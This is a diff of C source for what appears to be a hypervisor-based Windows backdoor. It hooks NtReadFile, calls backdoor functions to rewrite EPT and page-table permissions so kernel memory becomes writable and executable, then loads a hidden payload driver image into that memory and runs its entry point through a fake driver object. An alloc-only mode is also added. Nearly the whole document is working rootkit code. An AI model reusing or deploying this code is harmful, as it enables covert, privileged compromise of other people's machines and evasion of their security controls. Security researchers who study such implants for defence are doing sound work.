@@ -53,7 +53,7 @@ void bd_yeld(void)
 
 void bd_printf(char *format, ...)
 {
-    func_vsprintf f_vsprintf = (func_vsprintf)ImportGetProcAddress(0, H_vsprintf);
+    func_vsprintf f_vsprintf = (func_vsprintf)ImportGetProcAddress(I_MODULE_NT, H_vsprintf);
 
     if (f_vsprintf)
     {
@@ -68,14 +68,14 @@ void bd_printf(char *format, ...)
     }
 }
 //--------------------------------------------------------------------------------------
-PDRIVER_OBJECT DriverObjectAlloc(PDRIVER_INITIALIZE DriverInit)
+PDRIVER_OBJECT PayloadAllocDrvObj(PDRIVER_INITIALIZE DriverInit)
 {   
     OBJECT_ATTRIBUTES ObjAttr;
     PDRIVER_OBJECT DriverObject = NULL;
     ULONG ObjSize = sizeof(DRIVER_OBJECT) + sizeof(DRIVER_EXTENSION);
 
     // get object type address
-    POBJECT_TYPE *ObjType = (POBJECT_TYPE *)ImportGetProcAddress(0, H_IoDriverObjectType);
+    POBJECT_TYPE *ObjType = (POBJECT_TYPE *)ImportGetProcAddress(I_MODULE_NT, H_IoDriverObjectType);
     if (ObjType == NULL)
     {
         return NULL;
@@ -127,27 +127,60 @@ PDRIVER_OBJECT DriverObjectAlloc(PDRIVER_INITIALIZE DriverInit)
     return DriverObject;
 }
 //--------------------------------------------------------------------------------------
-NTSTATUS DriverMain(void)
-{   
+BOOLEAN PayloadMakeExecutable(uint64_t EptAddr, PVOID Mem, ULONG MemSize)
+{
+    for (ULONG i = 0; i < MemSize / PAGE_SIZE; i += 1)
+    {
+        uint64_t Addr = (uint64_t)RVATOVA(Mem, PAGE_SIZE * i);
+
+        // make page executable
+        if (backdoor_modify_pt(HVBD_MEM_WRITEABLE | HVBD_MEM_EXECUTABLE, Addr, m_Params.Cr3, EptAddr) != 0)
+        {
+            DbgMsg(__FILE__, __LINE__, "ERROR: backdoor_make_exec_pt() fails\n");
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
+//--------------------------------------------------------------------------------------
+PVOID PayloadAlloc(uint64_t EptAddr)
+{    
+    ULONG MemSize = m_Params.PayloadPagesCount * PAGE_SIZE;
+
+    // allocate memory for the payload
+    PVOID Mem = I_MmAllocateNonCachedMemory(MemSize);
+    if (Mem)
+    {
+        memset(Mem, 0, MemSize);
+
+        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Memory is at "IFMT", 0x%x bytes\n", Mem, MemSize);
+
+        // make payload memory executable
+        if (PayloadMakeExecutable(EptAddr, Mem, MemSize))
+        {
+            return Mem;
+        }
+
+        I_MmFreeNonCachedMemory(Mem, MemSize);
+    }
+    else
+    {
+        DbgMsg(__FILE__, __LINE__, "ERROR: MmAllocateNonCachedMemory() fails\n");        
+    }
+
+    return NULL;
+}
+//--------------------------------------------------------------------------------------
+PVOID PayloadRun(uint64_t EptAddr)
+{
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
     PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
         RVATOVA(m_Params.DriverBase, ((PIMAGE_DOS_HEADER)m_Params.DriverBase)->e_lfanew);
 
     // payload physical pages map is located at the end of the driver image
-    uint64_t *PagesMap = (uint64_t *)RVATOVA(m_Params.DriverBase, pHeaders->OptionalHeader.SizeOfImage);
-    uint64_t Ept = 0;
-
-    // bind current thread to the specific processor
-    KAFFINITY Affinity = (KAFFINITY)I_KeSetSystemAffinityThreadEx(1);
-
-    // get current EPT address
-    if (backdoor_ept_addr(&Ept) != 0)
-    {
-        goto _end;
-    }
-
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): CR3 = 0x%llx, EPT is at 0x%llx\n", m_Params.Cr3, Ept);
+    uint64_t *PagesMap = (uint64_t *)RVATOVA(m_Params.DriverBase, pHeaders->OptionalHeader.SizeOfImage);        
 
     // allocate memory for the payload data
     ULONG DataSize = m_Params.PayloadPagesCount * PAGE_SIZE;
@@ -201,14 +234,10 @@ NTSTATUS DriverMain(void)
         pSection += 1;
     }
 
-    for (ULONG i = 0; i < ImageSize / PAGE_SIZE; i += 1)
+    // make payload memory executable
+    if (!PayloadMakeExecutable(EptAddr, Image, ImageSize))
     {
-        // make page executable
-        if (backdoor_make_exec_pt((uint64_t)RVATOVA(Image, PAGE_SIZE * i), m_Params.Cr3, Ept) != 0)
-        {
-            DbgMsg(__FILE__, __LINE__, "ERROR: backdoor_make_exec_pt() fails\n");
-            goto _end;
-        }
+        goto _end;
     }
 
     // flush TLB and invalidate CPU caches
@@ -231,7 +260,7 @@ NTSTATUS DriverMain(void)
         RVATOVA(Image, pHeaders->OptionalHeader.AddressOfEntryPoint);
 
     // allocate dummy driver object
-    PDRIVER_OBJECT DriverObject = DriverObjectAlloc(DriverInit);
+    PDRIVER_OBJECT DriverObject = PayloadAllocDrvObj(DriverInit);
     if (DriverObject)
     {
         // call payload image entry point
@@ -244,21 +273,79 @@ NTSTATUS DriverMain(void)
         DbgMsg(__FILE__, __LINE__, "ERROR: DriverObjectAlloc() fails\n");
     }
 
-_end:
-
-    if (!NT_SUCCESS(Status))
-    {
-        I_MmFreeNonCachedMemory(Image, ImageSize);
-    }
+_end:    
 
     if (Data)
     {
         I_ExFreePool(Data);
-    }    
+    }
 
-    I_KeRevertToUserAffinityThreadEx(Affinity);
+    if (!NT_SUCCESS(Status))
+    {
+        if (Image)
+        {
+            I_MmFreeNonCachedMemory(Image, ImageSize);
+        }        
 
-    return Status;
+        return NULL;
+    }       
+
+    return Image;
+}
+//--------------------------------------------------------------------------------------
+void DriverMain(void)
+{
+    uint64_t InfoAddr = 0, EptAddr = 0;
+    uint32_t Val = 0;
+
+    lock_aquire(DRIVER_LOCK_ADDR);
+
+    // get call counter address
+    if (backdoor_ept_info_addr(&InfoAddr) == 0)
+    {
+        // read call counter
+        if (backdoor_virt_read_32(InfoAddr + DRIVER_INFO_COUNT, &Val) == 0)
+        {
+            // check if hook handler wasn't executed yet
+            if (Val == 0)
+            {
+                PVOID ImageAddr = NULL;
+
+                // bind current thread to the specific processor
+                KAFFINITY Affinity = (KAFFINITY)I_KeSetSystemAffinityThreadEx(1);
+
+                // get current EPT address
+                if (backdoor_ept_addr(&EptAddr) == 0)
+                {
+                    DbgMsg(
+                        __FILE__, __LINE__, __FUNCTION__"(): CR3 = 0x%llx, EPT is at 0x%llx\n", 
+                        m_Params.Cr3, EptAddr
+                    );
+
+                    if (m_Params.bAllocOnly)
+                    {
+                        // just allocate kernel memoty for the payload
+                        ImageAddr = PayloadAlloc(EptAddr);
+                    }
+                    else
+                    {
+                        // load and execute payload
+                        ImageAddr = PayloadRun(EptAddr);
+                    }
+                }                
+
+                I_KeRevertToUserAffinityThreadEx(Affinity);
+
+                // allocated memory address
+                backdoor_virt_write_64(InfoAddr + DRIVER_INFO_ADDR, (uint64_t)ImageAddr);
+            }
+
+            // update call counter
+            backdoor_virt_write_32(InfoAddr + DRIVER_INFO_COUNT, Val + 1);
+        }
+    }
+
+    lock_release(DRIVER_LOCK_ADDR);
 }
 //--------------------------------------------------------------------------------------
 NTSTATUS NTAPI new_NtReadFile(
@@ -272,30 +359,8 @@ NTSTATUS NTAPI new_NtReadFile(
     PLARGE_INTEGER ByteOffset,
     PULONG Key)
 {
-    uint64_t Addr = 0;
-    uint32_t Val = 0;
-
-    lock_aquire(DRIVER_LOCK_ADDR);
-
-    // get call counter address
-    if (backdoor_ept_info_addr(&Addr) == 0)
-    {
-        // read call counter
-        if (backdoor_virt_read_32(Addr, &Val) == 0)
-        {
-            // check if hook handler wasn't executed yet
-            if (Val == 0)
-            {
-                // exeute main function
-                DriverMain();
-            }
-
-            // update call counter
-            backdoor_virt_write_32(Addr, Val + 1);
-        }
-    }
-
-    lock_release(DRIVER_LOCK_ADDR);
+    // exeute main function
+    DriverMain();
 
     // call original function
     return ((func_NtReadFile)&old_NtReadFile)(
@@ -311,18 +376,11 @@ NTSTATUS NTAPI new_NtReadFile(
     );
 }
 //--------------------------------------------------------------------------------------
-void DriverUnload(PDRIVER_OBJECT DriverObject)
-{   
-    // ...
-}
-//--------------------------------------------------------------------------------------
 NTSTATUS DriverEntry(
     PDRIVER_OBJECT  DriverObject,
     PUNICODE_STRING RegistryPath)
 {
-    DriverObject->DriverUnload = DriverUnload;
-
-    return DriverMain();
+    return STATUS_UNSUCCESSFUL;
 }
 //--------------------------------------------------------------------------------------
 // EoF
